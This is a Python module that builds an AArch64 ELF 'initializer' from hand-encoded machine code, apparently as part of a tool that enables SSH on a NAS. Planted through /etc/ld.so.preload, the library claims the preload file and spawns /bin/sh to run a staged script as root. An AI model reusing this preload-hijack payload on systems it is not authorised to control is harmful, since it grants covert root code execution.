"""Generate our small Linux/AArch64 ELF initializer; no external assembler required.

Only UID 0 can atomically claim (and disarm) the loader file. The initializer
then forks a shell and immediately returns in the parent. All strings are
generated locally for one private staging directory.
"""
import re
import struct

from .api import NasError


def build_trigger(stage):
    if not re.fullmatch(r"/etc/\.nas-ssh-[0-9a-f]{12}", stage):
        raise NasError("Invalid private staging path.")
    words = [
        0xD28015C8, 0xD4000001, 0,          # getuid(174); if non-root: return
        0x92800C60, 0, 0x92800C62, 0,       # AT_FDCWD, old, AT_FDCWD, claimed
        0xD2800024, 0xD2802288, 0xD4000001, 0,  # renameat2(276), NOREPLACE
        0xD2800220, 0xAA1F03E1, 0xAA1F03E2, 0xAA1F03E3, 0xAA1F03E4,
        0xD2801B88, 0xD4000001, 0,          # clone(220, SIGCHLD)
        0, 0, 0xA9BE17E0, 0xF9000BFF, 0x910003E1, 0xAA1F03E2,
        0xD2801BA8, 0xD4000001,             # execve(221)
        0xD2800FE0, 0xD2800BA8, 0xD4000001, # exit(127), syscall 93
        0xD65F03C0,
    ]
    offset = 4 * len(words)
    strings = bytearray()
    labels = {}
    for name, value in (("old", "/etc/ld.so.preload"), ("claim", stage + "/preload.claimed"),
                        ("shell", "/bin/sh"), ("script", stage + "/run.sh")):
        labels[name] = offset + len(strings)
        strings += value.encode("ascii") + b"\0"

    def adr(index, register, name):
        delta = labels[name] - index * 4
        return 0x10000000 | ((delta & 3) << 29) | (((delta >> 2) & 0x7FFFF) << 5) | register

    for index, register, name in ((4, 1, "old"), (6, 3, "claim"), (19, 0, "shell"), (20, 5, "script")):
        words[index] = adr(index, register, name)
    for index in (2, 10, 18):
        words[index] = 0xB5000000 | (((30 - index) & 0x7FFFF) << 5)
    data = bytearray(4096) + struct.pack("<31I", *words) + strings
    data += bytes((-len(data)) % 8)
    strtab = len(data)
    data += bytes(8)
    symtab = len(data)
    data += bytes(24)
    dynamic_offset = len(data)
    dynamic = b"".join(struct.pack("<qQ", tag, value) for tag, value in
                       ((12, 4096), (5, strtab), (6, symtab), (10, 1), (11, 24), (0, 0)))
    data += dynamic
    data[:7] = b"\x7fELF\x02\x01\x01"
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 3, 183, 1, 0, 64, 0, 0, 64, 56, 2, 0, 0, 0)
    struct.pack_into("<IIQQQQQQ", data, 64, 1, 5, 0, 0, 0, len(data), len(data), 4096)
    struct.pack_into("<IIQQQQQQ", data, 120, 2, 4, dynamic_offset, dynamic_offset,
                     dynamic_offset, len(dynamic), len(dynamic), 8)
    return bytes(data)
